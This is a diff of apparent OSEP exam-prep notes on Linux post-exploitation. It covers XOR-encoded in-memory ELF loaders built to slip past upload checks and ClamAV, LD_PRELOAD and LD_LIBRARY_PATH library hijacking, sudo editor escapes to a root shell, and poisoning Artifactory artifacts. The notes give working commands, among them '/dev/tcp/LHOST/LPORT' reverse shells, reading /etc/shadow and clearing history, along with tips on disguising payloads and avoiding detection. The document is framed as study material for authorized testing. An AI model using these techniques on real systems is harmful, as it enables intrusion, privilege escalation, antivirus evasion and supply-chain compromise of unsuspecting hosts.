@@ -2,82 +2,40 @@
 For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
 :::
 
-# 13 · Linux attack surface (scenarios 36–40, 48)
+# Linux post-exploitation
 
-> Scenario map: 36 Linux upload site runs ELF but still requires a business check · 37 Linux target has AV · 38 Linux program loads a shared library from a path you control · 39 sudo allows only one editor/interpreter · 40 you can overwrite an artifact but cannot log into the consumer hosts · 48 no SSH password, but an already-authenticated reusable connection exists.
->
-> Aligned with PEN-300 (`pen-300.pdf`): Chapter 15 *Linux Post-Exploitation* (§15.2 *Bypassing Antivirus*, §15.3 *Shared Libraries (`LD_LIBRARY_PATH` & `LD_PRELOAD`)*) & Chapter 19 *Linux Lateral Movement* (§19.1 *SSH Keys, ControlMaster & SSH-Agent Forwarding*, §19.2.8–19.2.12 *Artifactory (JFrog)*).
->
-> Placeholders: `LHOST` (attacker IP) `LPORT` (listener port) `TARGET` (target address) `USER` `PASS` `DOMAIN` `PAYLOAD`. Commands assume x86_64 Linux unless noted.
+There is no AMSI / ETW / AppLocker stack here and no process-hollowing concept. The defense surface is on-disk AV (ClamAV and similar on-access scanners), runtime monitoring (`auditd` / eBPF / LSM), the SUID / sudo privilege model, and writable directories plus dynamic-linker search order. Leave no plaintext payload on disk; decode and execute in memory; reuse a privilege or trust context instead of stealing credentials.
 
-## Overview
+Placeholders: `LHOST` (attacker IP) `LPORT` (listener port) `TARGET` `USER` `PASS` `DOMAIN` `PAYLOAD`. Commands assume x86_64 Linux unless noted.
 
-| Scenario | One-line goal | Key scripts |
-|---|---|---|
-| 36 | ELF is executed but must pass a business check | `m13-xor-encoder.py` + `m13-simple-loader.c` (business-output mode) |
-| 37 | Common ELF is detected by Linux AV | `m13-xor-encoder.py` + `m13-simple-loader.c` (in-memory decode mode) |
-| 38 | Program loads a shared library from a path you control | `m13-shared-library-ldpreload.c` / `m13-shared-library-ldlibrarypath.c` |
-| 39 | sudo allows only one editor/interpreter | `m13-sudo-gtfobins.sh` |
-| 40 | You can overwrite the artifact; you cannot log into the consumer | `m13-artifactory-replace.sh` |
-| 48 | No SSH password, but a reusable connection exists | `m13-ssh-controlmaster-hijack.sh` |
+## Upload site runs ELF, but it must pass a business check
 
-**Core Linux vs Windows difference (module premise)**: there is no AMSI/ETW/AppLocker stack and no “process hollowing” concept. The defense surface is mainly on-disk AV signature scanning (ClamAV and similar on-access scanners), runtime monitoring (`auditd`/eBPF/LSM), the SUID/sudo privilege model, and writable directories plus dynamic-linker search order. Windows AV-bypass patterns (patch ETW, reflective managed load) do not apply here. Reframe to: **leave no plaintext payload on disk, decode and execute in memory, reuse privilege/trust context instead of stealing credentials**.
+If an upload-and-execute site accepts an ELF and runs it, but a plain reverse-shell ELF fails a business check — expected banner, a fixed alive-window, or a final exit 0 — wrap the payload in a loader that looks legitimate. A bare shell ELF either exits immediately (session dies with it) or prints no business output and is marked FAIL and killed.
 
----
+- [ ] Prepare stage-two ELF and XOR-encode it with `m13-xor-encoder.py` into `stage2.enc`
+- [ ] Build the loader in business mode (external file, or embed the payload as a C array)
+- [ ] Start a listener
+- [ ] Upload `loader` and `stage2.enc`, trigger execution, confirm the business check passes
+- [ ] Confirm the callback, then let the loader parent exit 0
 
-## Scenario 36 · Linux upload site executes ELF, but the program must still pass a business check
+Encode and build:
 
-### Situation
-The lab has an “upload-and-execute” site (it accepts an ELF and runs it). Uploading a plain reverse-shell ELF fails: the site has a **business check** — a wrapper runs your upload and requires that it (a) print expected business output/banner, (b) stay alive for a fixed window (lifecycle check), or (c) finally exit 0. A bare shell ELF either exits immediately (session dies with it) or prints no business output and is marked FAIL and killed.
+```bash
+python3 m13-xor-encoder.py --key 0x41 -i stage2.bin -o stage2.enc       # file mode
+python3 m13-xor-encoder.py --key 0x41 -i stage2.bin --c-array          # C-array mode (embed)
+gcc -o loader m13-simple-loader.c                                     # business / in-memory modes via macros
+nc -lvnp LPORT
+```
 
-### Assumptions
-- The site runs the upload as your user (not setuid to root).
-- From the scenario text or a readable wrapper you can infer the expected “business output” (e.g. must print `Usage: run ...` or a heartbeat loop).
-- Outbound TCP to `LHOST:LPORT` is allowed (same egress conditions as earlier scenarios).
-- Attacker host has gcc and python3 to build the loader and encode the file.
-- The upload directory is writable so you can upload both the loader and the data file; if it is execute-only / deleted after run, switch to the embedded-payload mode (see failure branches).
+External mode: loader and `stage2.enc` in the same directory. Embedded mode: first `--c-array` for a byte array, then compile it into the loader. The loader parent prints the business banner and enters a heartbeat loop matching site expectations; it decodes `stage2.enc` and starts stage two in a child from memory (`mmap` → `mprotect`, no plaintext on disk). After the callback arrives, the loader parent exits cleanly (exit 0) and leaves no suspicious long-lived process.
 
-### Prepare (attacker)
-1. Prepare stage-2 ELF (reverse agent or `/bin/sh` reverse), e.g. a minimal reverse program or a compiled stage2.
-2. Encode stage2 with `m13-xor-encoder.py` into `stage2.enc` (ciphertext on disk; avoids signature/content checks).
-3. Build the loader in business mode:
-   - External: `gcc -o loader loader.c` (loader and `stage2.enc` in the same directory).
-   - Embedded: first `m13-xor-encoder.py --c-array` for a byte array, then compile it into the loader.
-4. Start a listener: `nc -lvnp LPORT` or your C2 listener.
+If the site requires an exact banner, change the loader `BANNER` macro to the exact required text, rebuild, and re-upload. If the upload dir is deleted after exec / not writable again, use embed mode (encode the payload into a single loader file) and support a `-banner` argument for business output. If the arch is wrong (site is x86_64 but stage two / loader is 32-bit or vice versa), rebuild both with `gcc -m64` / `-m32` and verify with `file loader stage2.enc`.
 
-### Procedure
-1. Build a “legitimate shell”: the loader parent prints the business banner and enters a loop (heartbeat) matching site expectations.
-2. Upload `loader` and `stage2.enc` to the site’s designated directory.
-3. Trigger execution (site button/API, or whatever trigger you found).
-4. Confirm site output: business check passes (banner matches, process stays alive).
-5. Loader decodes `stage2.enc` and starts stage2 **in a child** from memory (mmap→mprotect, no plaintext on disk).
-6. After the callback arrives, the loader parent exits cleanly (exit 0) and leaves no suspicious long-lived process.
+If the business check kills the process after a fixed time, have stage two fork an independent session as soon as it is decoded; the loader only needs "business output + exit 0" before the window ends — it does not need to stay resident. If the callback is filtered (only same-subnet as the site), skip reverse connect; have stage two write results to the loader's stdout (piggyback on the business-output channel) and read them from the site page.
 
-### Lab files
-- `m13-xor-encoder.py`: XOR-encode stage2 (file mode / C-array mode).
-- `m13-simple-loader.c`: read/embed encoded payload, decode and run in memory; includes business-output mode and heartbeat lifecycle logic.
+Match the banner to the legitimate program's output so logs do not show a "PASS but weird banner". Disk should only show `.enc` / loader — never upload a plaintext reverse ELF. After the session lands, do not dump sensitive output into site-visible stdout; confirm quietly first. Before leaving, clean leftover `stage2.enc` and loader from the upload dir (if the scenario still allows writes).
 
-### Verify
-- Site shows business check PASS (correct banner, process alive for the check window).
-- Attacker listener gets a session: `id` / `whoami` match expectations.
-- After the check window, loader exits normally; no plaintext payload remains on disk.
-
-### Failure branches / fallbacks
-1. **Site requires an exact banner/output**: change the loader `BANNER` macro to the exact required text, rebuild, re-upload.
-2. **Upload dir deleted after exec / not writable again**: use embed mode (encode payload into a single loader file) and support a `-banner` argument for business output.
-3. **Arch mismatch** (site is x86_64 but stage2/loader is 32-bit or vice versa): rebuild both with `gcc -m64`/`-m32`; verify with `file loader stage2.enc`.
-4. **Business check kills the process after a fixed time**: have stage2 fork an independent session as soon as it is decoded; loader only needs “business output + exit 0” before the window ends — it does not need to stay resident.
-5. **Callback filtered (only same-subnet as the site)**: skip reverse connect; have stage2 write results to the loader’s stdout (piggyback on the business-output channel) and read them from the site page.
-
-### Exam / OPSEC notes
-- Match the banner to the legitimate program’s output so logs do not show a “PASS but weird banner”.
-- Disk should only show `.enc`/loader — never upload a plaintext reverse ELF.
-- After the session lands, do not dump sensitive output into site-visible stdout; confirm quietly first.
-- Before leaving, clean leftover `stage2.enc` and loader from the upload dir (if the scenario still allows writes).
-
----
-
-#### `m13-xor-encoder.py`
+::: details `m13-xor-encoder.py` · click to expand
 
 ````python
 #!/usr/bin/env python3
@@ -187,7 +145,10 @@ if __name__ == "__main__":
     sys.exit(main())
 ````
 
-#### `m13-simple-loader.c`
+:::
+
+
+::: details `m13-simple-loader.c` · click to expand
 
 ````c
 /* Purpose: Custom Linux ELF/shellcode loader — read XOR-encrypted payload, mmap memory → decode →
@@ -495,107 +456,78 @@ int main(int argc, char **argv)
 }
 ````
 
-## Scenario 37 · Linux target also has AV; common ELF is detected
+:::
 
-### Situation
-The Linux host has AV (typically ClamAV on-access/on-scan; the exam may also use a signature scanner over disk files). Common generated ELF — e.g. msfvenom `linux/x64/shell_reverse_tcp`, or stock reverse binaries from the internet — is detected/deleted on land or on exec. **Windows techniques (patch AMSI/ETW, process hollowing, managed reflection) do not work here**; rebuild for the Linux detection model.
 
-### Assumptions
-- AV is primarily file scanning (local test: `clamscan PAYLOAD`); whether runtime monitoring (auditd/eBPF) is also present is unknown — assume yes.
-- You control payload shape and placement (disk vs pure memory).
-- You do not need to bypass login/rights — only keep your ELF alive and callback.
+## Linux AV detects a common ELF
 
-### Prepare (attacker)
-1. Red-team self-test on the attacker box: `clamscan stage2`, `file stage2`, `strings stage2 | grep -iE 'socket|/bin/sh'` — confirm what gets signed.
-2. XOR-encode stage2 with `m13-xor-encoder.py` to `.enc` (on-disk form no longer carries plaintext signature features).
-3. Build `m13-simple-loader.c` (in-memory decode): `mmap(PROT_READ|PROT_WRITE)` → decode → `mprotect(PROT_READ|PROT_EXEC)` → jump; never write plaintext to disk.
-4. (Optional) Use a `memfd_create()` variant so even `.enc` is not needed on disk.
+If the Linux host has AV (typically ClamAV on-access / on-scan) and a common generated ELF — e.g. msfvenom `linux/x64/shell_reverse_tcp`, or a stock reverse binary — is detected or deleted on land or on exec, rebuild for the Linux detection model. Windows techniques (patch AMSI/ETW, process hollowing, managed reflection) do not work here.
 
-### Procedure
-1. Deliver only the loader (+ `.enc`); disguise the loader name as business-related (`update`, `monitor`) — filename should not reveal intent.
-2. Trigger run; loader reads `.enc` into anonymous memory and executes stage2.
-3. Stage2 callbacks to `LHOST:LPORT`; confirm the session on your listener.
-4. Inside the session, avoid writing plaintext tools to `/tmp`; re-use encode + in-memory load when needed.
+- [ ] Self-test on the attacker box: `clamscan stage2`, `file stage2`, `strings stage2 | grep -iE 'socket|/bin/sh'`
+- [ ] XOR-encode stage two to `.enc` so the on-disk form no longer carries plaintext signature features
+- [ ] Build `m13-simple-loader.c` (in-memory decode): `mmap(PROT_READ|PROT_WRITE)` → decode → `mprotect(PROT_READ|PROT_EXEC)` → jump; never write plaintext to disk
+- [ ] Deliver only the loader (+ `.enc`); disguise the loader name as business-related (`update`, `monitor`)
+- [ ] Confirm the callback; inside the session, avoid writing plaintext tools to `/tmp`
 
-### Lab files
-- `m13-xor-encoder.py` (changes the on-disk signature surface).
-- `m13-simple-loader.c` (in-memory decode; avoids plaintext on disk).
+Optional: use a `memfd_create()` variant so even `.enc` is not needed on disk.
 
-### Verify
-- Run `clamscan` on loader/`.enc` before and after delivery: loader clean or light; `.enc` lacks original signatures.
-- Listener gets a session after exec; no plaintext stage2 under `/proc/<pid>/maps` or `ls -l /tmp`.
-- If on-access scanning is present, confirm no alert in logs at the moment of delivery.
+Run `clamscan` on the loader / `.enc` before and after delivery: the loader should be clean or light; `.enc` should lack the original signatures. A session on the listener after exec, with no plaintext stage two under `ls -l /tmp` (decoded payload lives in anonymous mappings, not as a file), is the check. If on-access scanning is present, confirm no alert in the logs at the moment of delivery.
 
-### Failure branches / fallbacks
-1. **Static loader itself is detected**: shrink/simplify the loader (drop high-frequency strings like `system`/`socket`; call via `syscall()`); or add a packer layer (upx / custom compress) and re-self-test.
-2. **eBPF/LSM runtime monitoring blocks `mprotect RW→RX`**: map as `PROT_READ|PROT_EXEC` from the start then write (when W^X is hard-enforced) or use `memfd_create` + an existing interpreter (`python3`/`perl`) to run memory contents and avoid mmap RWX features.
-3. **Signature is “behavior/metadata” not content** (e.g. embedded C2 domain/IP in the ELF): split/XOR-restore `LHOST` at runtime so plaintext IP never appears outside `.enc`.
-4. **AV also blocks `.enc` (rare; usually content-signed)**: change suffix/header (fake magic); loader skips the offset then decodes.
-5. **No file writes allowed at all**: drop the file carrier; run the in-memory decode logic of `m13-simple-loader` through whatever stdin/arg injection channel the scenario already gives for ELF exec.
+If the static loader itself is detected, shrink it (drop high-frequency strings like `system` / `socket`; call via `syscall()`), or add a packer layer (upx / custom compress) and re-self-test. If eBPF / LSM runtime monitoring blocks `mprotect` RW→RX, map as `PROT_READ|PROT_EXEC` from the start then write (when W^X is hard-enforced), or use `memfd_create` plus an existing interpreter (`python3` / `perl`) to run memory contents and avoid mmap RWX features.
 
-### Exam / OPSEC notes
-- Do not `wget`/`curl` plaintext payload into `/tmp` on the target — that is when file scanners bite hardest.
-- Compile with `-s` (strip); avoid extra RWX beyond what you need (no gratuitous `-z execstack`); self-test before going live.
-- Do not immediately kill AV processes from the session — that often triggers correlated alerts.
+If the signature is behavior / metadata, not content (e.g. an embedded C2 domain / IP in the ELF), split or XOR-restore `LHOST` at runtime so a plaintext IP never appears outside `.enc`. If AV also blocks `.enc` (rare; usually content-signed), change the suffix / header (fake magic); the loader skips the offset then decodes. If no file writes are allowed at all, drop the file carrier and run the in-memory decode logic of `m13-simple-loader` through whatever stdin / arg injection channel the scenario already gives for ELF exec.
 
----
+Do not `wget` / `curl` a plaintext payload into `/tmp` on the target — that is when file scanners bite hardest. Compile with `-s` (strip); avoid extra RWX beyond what you need (no gratuitous `-z execstack`); self-test before going live. Do not immediately kill AV processes from the session — that often triggers correlated alerts.
 
-## Scenario 38 · Linux program loads a shared library from a path you control
+## Program loads a shared library from a path you control
 
-### Situation
-A higher-privilege program on the target (service / cron / triggered script) resolves a shared library that is missing, or that can be resolved from a path you can write. The idea is not to patch the binary, but to **make the dynamic linker run your `.so` constructor at load time**. Two main lines: `LD_PRELOAD` (force-load your library first whether or not anything is missing) and `LD_LIBRARY_PATH` (the program really lacks a library; you place a **same-named library exporting the same symbols** ahead in the search path). Mechanisms differ: name match, symbol export, load order, and setuid “secure-execution” limits all matter.
+If a higher-privilege program resolves a shared library that is missing, or that can be resolved from a path you can write, make the dynamic linker run your `.so` constructor at load time — do not patch the binary. Two lines: `LD_PRELOAD` (force-load your library first, whether or not anything is missing) and `LD_LIBRARY_PATH` (the program really lacks a library; you place a same-named library exporting the same symbols ahead in the search path). If the target is setuid / setgid, glibc ignores `LD_PRELOAD` and `LD_LIBRARY_PATH` under AT_SECURE — confirm first. Otherwise the real entry is "program is missing a library and its RPATH / RUNPATH points at a writable directory".
 
-### Assumptions
-- You can control the target program’s environment (the service/script that runs it is yours or triggered from a path you control), or you can write into a directory on its search path.
-- You have code execution (can upload a `.so`, e.g. via upload site / writable dir), but **no password for the target user** — goal is to borrow the program’s higher rights.
-- If the target is setuid/setgid: glibc ignores `LD_PRELOAD` and `LD_LIBRARY_PATH` under AT_SECURE; confirm first (`getauxval` / `ldd` behavior). Otherwise the real entry is “program is missing a library and its RPATH/RUNPATH points at a writable directory”.
+- [ ] Map the target and missing libs: `ldd`, `readelf -d`, and when / as whom it runs
+- [ ] Pick the line (PRELOAD vs same-name replace) and build the `.so` on the attacker box
+- [ ] Upload it and trigger the program
+- [ ] Confirm your code runs as the target identity, and the host program still completes its normal business
 
-### Prepare (attacker)
-1. Map the target and missing libs:
-   - `ldd TARGET_BIN` (look for missing/not found)
-   - `readelf -d TARGET_BIN | grep -E 'RPATH|RUNPATH|NEEDED'`
-   - `sudo -l` / `ps aux` / `systemctl list-units` to see when/as whom it runs.
-2. Pick which line to take (below).
-3. Build the `.so` on the attacker box (see compile commands in the script headers) and upload it.
+Map the target:
 
-### Procedure
-**A. LD_PRELOAD line (`m13-shared-library-ldpreload.c`)**
-1. Program already runs normally (libs present) → inject with `LD_PRELOAD`:
-   - `LD_PRELOAD=/path/to/lib.so TARGET_BIN [args...]`
-2. Your library uses `__attribute__((constructor))` to run priv-esc/callback code at load time, then **preserves original program behavior** (do not override normal functions and crash the business).
-3. If the program is setuid, first check whether `LD_PRELOAD` is ignored: no effect after `LD_PRELOAD=... TARGET_BIN` → switch to B or another entry (this limit is a feature, not a bug).
+```bash
+ldd TARGET_BIN                          # look for missing/not found
+readelf -d TARGET_BIN | grep -E 'RPATH|RUNPATH|NEEDED'
+sudo -l; ps aux; systemctl list-units   # when / as whom it runs
+```
 
-**B. LD_LIBRARY_PATH line (`m13-shared-library-ldlibrarypath.c`)**
-1. Program is missing a lib (`ldd` shows `not found`, e.g. `libcrypto.so.1.1`) → the library **name must match exactly**.
-2. Place a same-named `.so` in a directory you control; prepend search with `LD_LIBRARY_PATH=/controlled/dir`: `LD_LIBRARY_PATH=/tmp/x TARGET_BIN`.
-3. The `.so` must export symbols the program uses (stub whatever is missing: copy the export table with `nm -D` from the real lib, or use the “dlopen real lib then forward” pattern from the quick-reference notes), and also run your code from `__attribute__((constructor))`.
-4. Confirm resolution with `ldd`: `LD_LIBRARY_PATH=/controlled/dir ldd TARGET_BIN` should show your `.so`.
-5. Trigger the program (service restart / job / wait for cron) and confirm your code runs as the target identity.
+### LD_PRELOAD
 
-### Lab files
-- `m13-shared-library-ldpreload.c`: LD_PRELOAD injection (does not require a missing library).
-- `m13-shared-library-ldlibrarypath.c`: same-name replacement for a missing library (must verify name and exported symbols).
+If the program already runs normally (libs present), inject with `LD_PRELOAD`:
 
-### Verify
-- `ldd` shows the target library path pointing at your file (LD_LIBRARY_PATH line).
-- Listener receives a callback as the target user, or `id` shows successful privilege gain.
-- The host program still completes its normal business (no crash, no error spam).
+```bash
+gcc -Wall -fPIC -shared -o lib.so m13-shared-library-ldpreload.c -ldl
+LD_PRELOAD=/path/to/lib.so TARGET_BIN [args...]
+```
 
-### Failure branches / fallbacks
-1. **Name mismatch / missing export → `symbol lookup error`**: use `nm -D` to stub every referenced symbol from the real lib; name must match character-for-character (including `.so.1.1`-style version suffixes).
-2. **LD_PRELOAD ignored on setuid**: confirm setuid (`ls -l` / `find -perm -4000`); if yes, switch to “writable RPATH directory” or another non-setuid high-priv entry — do not burn time on “why PRELOAD did nothing”.
-3. **Load-order issues**: LD_PRELOAD always loads first; LD_LIBRARY_PATH is inserted after RPATH and before default paths — if the binary has its own RPATH elsewhere, LD_LIBRARY_PATH will not win; replace the same-named library inside the RPATH directory instead.
-4. **Program crashes on start**: `fork()` the callback into a child inside the constructor before heavy work so the parent keeps the original init path; or delay until a business function is called.
-5. **Environment sanitized** (service uses `env -i` / systemd clears env): set the vars in something the program itself reads (wrapper script, writable `/etc/environment`), or replace the real library file in its load directory (backup first).
+Your library uses `__attribute__((constructor))` to run priv-esc / callback code at load time, then preserves original program behavior (do not override normal functions and crash the business). If the program is setuid, first check whether `LD_PRELOAD` is ignored: no effect after `LD_PRELOAD=... TARGET_BIN` → switch to the `LD_LIBRARY_PATH` line or another entry (this limit is a feature, not a bug).
 
-### Exam / OPSEC notes
-- Backup original libraries/files first; restore on exit to avoid business outage exposure.
-- After priv-esc/callback, do not leave shell history (`.bash_history`) or plaintext `.so` sources.
-- Setuid cases: do not treat “PRELOAD ineffective” as a bug and retry forever — check `file`/`ls -l` for AT_SECURE first.
+### LD_LIBRARY_PATH
 
----
+If the program is missing a lib (`ldd` shows `not found`, e.g. `libcrypto.so.1.1`), the library name must match exactly:
 
-#### `m13-shared-library-ldpreload.c`
+```bash
+gcc -Wall -fPIC -shared -o libmissing.so.1.1 m13-shared-library-ldlibrarypath.c -ldl
+LD_LIBRARY_PATH=/controlled/dir TARGET_BIN
+LD_LIBRARY_PATH=/controlled/dir ldd TARGET_BIN    # should show your .so
+```
+
+The `.so` must export symbols the program uses (stub whatever is missing: copy the export table with `nm -D` from the real lib, or use the "dlopen real lib then forward" pattern from the script comments), and also run your code from `__attribute__((constructor))`. Trigger the program (service restart / job / wait for cron) and confirm your code runs as the target identity.
+
+If you get `symbol lookup error`, use `nm -D` to stub every referenced symbol from the real lib; the name must match character-for-character (including `.so.1.1`-style version suffixes). If `LD_PRELOAD` is ignored on setuid, confirm setuid (`ls -l` / `find -perm -4000`) and switch to a writable RPATH directory or another non-setuid high-priv entry — do not burn time on "why PRELOAD did nothing".
+
+Load order matters: `LD_PRELOAD` always loads first. `LD_LIBRARY_PATH` is searched after `DT_RPATH` and before the default paths, but *before* `DT_RUNPATH`. If the binary has its own `RPATH`, `LD_LIBRARY_PATH` will not win — replace the same-named library inside the RPATH directory instead. If it has `RUNPATH`, `LD_LIBRARY_PATH` wins.
+
+If the program crashes on start, `fork()` the callback into a child inside the constructor before heavy work so the parent keeps the original init path, or delay until a business function is called. If the environment is sanitized (service uses `env -i` / systemd clears env), set the vars in something the program itself reads (wrapper script, writable `/etc/environment`), or replace the real library file in its load directory (backup first).
+
+Backup original libraries / files first; restore on exit to avoid a business outage. After priv-esc / callback, do not leave shell history (`.bash_history`) or plaintext `.so` sources. Setuid cases: do not treat "PRELOAD ineffective" as a bug and retry forever — check `file` / `ls -l` for AT_SECURE first.
+
+::: details `m13-shared-library-ldpreload.c` · click to expand
 
 ````c
 /* Purpose: Shared-library payload for LD_PRELOAD — on load (constructor), run the payload in a
@@ -697,7 +629,10 @@ uid_t geteuid(void)
 #endif
 ````
 
-#### `m13-shared-library-ldlibrarypath.c`
+:::
+
+
+::: details `m13-shared-library-ldlibrarypath.c` · click to expand
 
 ````c
 /* Purpose: Shared library for LD_LIBRARY_PATH hijack — filename must match the missing library
@@ -826,53 +761,39 @@ pid_t getpid(void)
 }
 ````
 
-## Scenario 39 · sudo allows only one editor or interpreter
+:::
 
-### Situation
-`sudo -l` shows the current user is allowed only one program (e.g. `/usr/bin/vim`, `/usr/bin/find`, `/usr/bin/lua`, often `NOPASSWD`) and it runs as root. No other local priv-esc path. Goal: **escape a shell from that trusted program itself** (GTFOBins idea), and handle sudoers argument restrictions.
 
-### Assumptions
-- `sudo -l` confirms the allow entry: e.g. `(root) NOPASSWD: /usr/bin/vim` or `(ALL) /usr/bin/find *`.
-- sudoers may restrict argument patterns (e.g. `vim /home/user/*`, `find /var/log`) or may not.
-- You can interactively run the command (have a TTY or can trigger via webshell/script).
+## sudo allows only one editor or interpreter
 
-### Prepare (attacker)
-1. Enumerate first: `sudo -l`, `sudo -ll` (argument patterns), `id`.
-2. Confirm the allowlisted program’s GTFOBins escape (vim/find/lua shell escapes below).
-3. Local listener `nc -lvnp LPORT` (if reverse) or prepare interactive commands to collect output.
+If `sudo -l` shows the current user is allowed only one program (e.g. `/usr/bin/vim`, `/usr/bin/find`, `/usr/bin/lua`, often `NOPASSWD`) and it runs as root, escape a shell from that trusted program itself (GTFOBins). Read the full allow entry and any argument restrictions first — do not assume sudo can run anything.
 
-### Procedure
-1. `sudo -l` to confirm the entry and NOPASSWD status.
-2. Escape per allowlisted program (pick one; the script auto-matches):
-   - **vim**: `sudo vim -c ':!/bin/sh'` (interactive); or `sudo vim -c ':set shell=/bin/sh' -c ':shell'`; non-interactive: `sudo vim -c ':!/bin/sh -c "id > /tmp/out; cat /tmp/out"'`.
-   - **find**: `sudo find . -exec /bin/sh \; -quit` (or `-exec /bin/sh -p \;`); if args are restricted see failure branches.
-   - **lua**: `sudo lua -e 'os.execute("/bin/sh")'`; or `sudo lua -e 'os.execute("bash -i >& /dev/tcp/LHOST/LPORT 0>&1")'` for a direct reverse.
-3. Confirm root shell: `id` (uid=0).
-4. Continue lateral / grab flag as needed; keep commands short and avoid history.
+- [ ] `sudo -l` / `sudo -ll` (argument patterns) and `id`
+- [ ] Confirm the allowlisted program's GTFOBins escape
+- [ ] Escape, then confirm a root shell (`id` → `uid=0`)
+- [ ] If arguments are restricted, switch to a read-type escape instead of forcing a shell
 
-### Lab files
-- `m13-sudo-gtfobins.sh`: parse `sudo -l` allow entries, print/run matching vim/find/lua escapes; includes read/exfil modes when arguments are restricted.
+```bash
+sudo -l
+sudo vim -c ':!/bin/sh'                                 # interactive
+# or: sudo vim -c ':set shell=/bin/sh' -c ':shell'
+# non-interactive: sudo vim -c ':!/bin/sh -c "id > /tmp/out; cat /tmp/out"'
+sudo find . -exec /bin/sh \; -quit                      # or -exec /bin/sh -p \;
+sudo lua -e 'os.execute("/bin/sh")'
+sudo lua -e 'os.execute("bash -i >& /dev/tcp/LHOST/LPORT 0>&1")'
+```
 
-### Verify
-- `sudo -l` entry exists and either prompts no password (NOPASSWD) or you know `PASS`.
-- Escape returns a root shell: `id` shows `uid=0(root)`.
-- Under restrictions you can still read target files (`/etc/shadow`, flag) or establish a reverse.
+`m13-sudo-gtfobins.sh` parses `sudo -l` allow entries, prints or runs matching vim / find / lua escapes, and includes read / exfil modes when arguments are restricted. A root shell (`id` shows `uid=0(root)`) is the check. Under restrictions you should still be able to read target files (`/etc/shadow`, flag) or establish a reverse.
 
-### Failure branches / fallbacks
-1. **sudoers restricts arguments** (e.g. `vim /home/user/*`): argv is limited but vim internal commands are not — enter with `sudo vim /home/user/x` then `:e /etc/shadow`, `:r /etc/shadow`, `:!/bin/sh` (if allowed) to read; if find path is limited, try `sudo find /home/user -exec ...` only if `-exec` is in the pattern; otherwise switch to a “read-type” escape.
-2. **Escape explicitly banned in sudoers** (e.g. `!*sh*`): try other escapes in the same program (vim `:terminal`/`:python3` if built with support; if find `-exec sh` is banned try `-exec bash`/`-exec awk`); otherwise fall back to “read file + exfil” instead of a shell.
-3. **No TTY** (web exec): use non-interactive variants that write results to a readable file, or one-liner reverse `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` via `-c '...'`.
-4. **Program version lacks that escape**: check current GTFOBins entry and switch (e.g. vim also has `:!bash`, same for `view`); keep multiple alternatives in the script.
-5. **sudo needs a password you do not know**: this scenario assumes NOPASSWD or known `PASS`; if neither, this is not the entry — fall back to other modules (credential collection / service weaknesses).
+If sudoers restricts arguments (e.g. `vim /home/user/*`), argv is limited but vim internal commands are not — enter with `sudo vim /home/user/x` then `:e /etc/shadow`, `:r /etc/shadow`, `:!/bin/sh` (if allowed) to read. If find's path is limited, try `sudo find /home/user -exec ...` only if `-exec` is in the pattern; otherwise switch to a read-type escape.
 
-### Exam / OPSEC notes
-- Read the full `sudo -l` entry and comments first — do not assume “sudo can run anything”; only hit the allowlisted entry; out-of-policy commands get logged.
-- In the root shell disable/clean history: `unset HISTFILE`.
-- Do not spam failed sudo commands on a shared sudoers host; get it right once.
+If the escape is explicitly banned in sudoers (e.g. `!*sh*`), try other escapes in the same program (vim `:terminal` / `:python3` if built with support; if find `-exec sh` is banned try `-exec bash` / `-exec awk`). Otherwise fall back to "read file + exfil" instead of a shell.
 
----
+If there is no TTY (web exec), use non-interactive variants that write results to a readable file, or a one-liner reverse `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` via `-c '...'`. If the program version lacks that escape, check the current GTFOBins entry and switch (e.g. vim also has `:!bash`, same for `view`); keep multiple alternatives in the script.
 
-#### `m13-sudo-gtfobins.sh`
+If sudo needs a password you do not know, this is not the entry — fall back to credential collection / service weaknesses. In the root shell, `unset HISTFILE`. Do not spam failed sudo commands on a shared sudoers host; get it right once. Out-of-policy commands get logged.
+
+::: details `m13-sudo-gtfobins.sh` · click to expand
 
 ````bash
 #!/usr/bin/env bash
@@ -1194,58 +1115,39 @@ case "$ACTION" in
 esac
 ````
 
-## Scenario 40 · You can overwrite the artifact, but cannot log into the consumer hosts
+:::
 
-### Situation
-The lab has an artifact repository / distribution service (aligned with the cheat-sheet **Artifactory (JFrog)** class of scenarios): you gained write access to artifact storage (you can **overwrite/replace** an artifact that downstream machines download and run), but **cannot SSH/log into those consumer hosts**. Goal: make the consumer run your code (callback/implant) on the next pull/exec, while keeping the artifact “looking normal” (same filename, arch, business behavior) to avoid detection.
 
-### Assumptions
-- You already have a writable point on the repo side (Artifactory admin/upload API, creds in a backup store, or filesystem write), and can locate the artifact’s real path in storage.
-- You know or can observe which artifact the consumer downloads, how it uses it (run binary? unpack jar? run script?), and the trigger cadence/method.
-- Outbound callback conditions match earlier scenarios; `LHOST:LPORT` is reachable from the consumer.
+## You can overwrite the artifact, but cannot log into the consumers
 
-### Prepare (attacker)
-1. Confirm Artifactory process and layout (common path `/opt/jfrog/artifactory/`):
-   - `ps aux | grep artifactory`
-   - Backup/cred clues: `/opt/jfrog/artifactory/var/backup/access` (encrypted creds/DB backups), or data dir `.../var/data/access/derby` (copy out offline if needed — see quick-reference notes).
-2. Locate the target artifact file: search filestore by name/checksum (Artifactory usually has a binary store + metadata); confirm **arch and format** (`file`, `readelf -h`: x86_64 consumer cannot run an arm artifact).
-3. Build the replacement:
-   - Preserve original business behavior (if the scenario requires the consumer to keep working), and layer your code; or wrap as “callback first, then original logic”.
-   - Optionally use `m13-xor-encoder.py` + `m13-simple-loader.c` for an in-memory load shape so the landed “artifact” has no plaintext payload.
-4. Start a listener on the attacker box.
+If you have write access to an artifact repository (Artifactory / a generic binary repo) and can overwrite an artifact that downstream machines download and run, but cannot SSH / log into those consumer hosts, make the consumer run your code on the next pull. Keep the artifact looking normal (same filename, arch, business behavior). Backup the original first.
 
-### Procedure
-1. Find the target file in artifact storage; **backup the original** first (`.bak`, same dir or copy back to attacker for restore/compare).
-2. Use `m13-artifactory-replace.sh` for the swap: backup → drop replacement → (if needed) restore owner/mode/metadata → record original checksum.
-3. Trigger/wait for consumer pull: restart/refresh consumer jobs, or wait for the repo’s pull interval.
-4. Confirm callback on the listener; inside the session confirm identity/environment and collect target info.
-5. Cleanup: restore the original artifact as needed (script supports `--restore`); tear down listener and temp files.
+- [ ] Confirm the Artifactory process and layout; locate the target artifact and record arch / checksum
+- [ ] Build a replacement that preserves original business behavior (or wraps "callback first, then original logic")
+- [ ] Backup → replace → restore owner / mode / metadata
